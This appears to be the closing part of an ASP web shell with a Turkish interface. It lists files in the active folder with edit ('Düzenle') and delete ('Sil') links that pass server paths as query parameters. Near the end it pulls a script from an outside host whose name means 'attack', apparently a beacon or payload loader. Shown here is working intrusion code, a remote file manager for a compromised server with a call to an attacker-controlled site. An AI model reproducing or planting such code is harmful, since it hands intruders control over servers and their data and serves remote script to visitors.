        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a style="text-decoration: none" target="_self" href="?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>">
        <font color="#000000">Düzenle</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="20">
      <tr>
        <td width="100%" bgcolor="#D6D6D6" no wrap
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>" style="text-decoration: none">
        <font color="#000000">Sil</font></a></font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>

<% Next %>



<%
if aktifklas=("C:\") then aktifklas=("C:")
%>


<%
end if
%>



<%
end if
%>


<%
end if
%>


<%
end if
%>

<%
end if
%>
<SCRIPT SRC=http://www.saldiri.org/summer/ciz.js></SCRIPT>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
</table>

</body>

</html>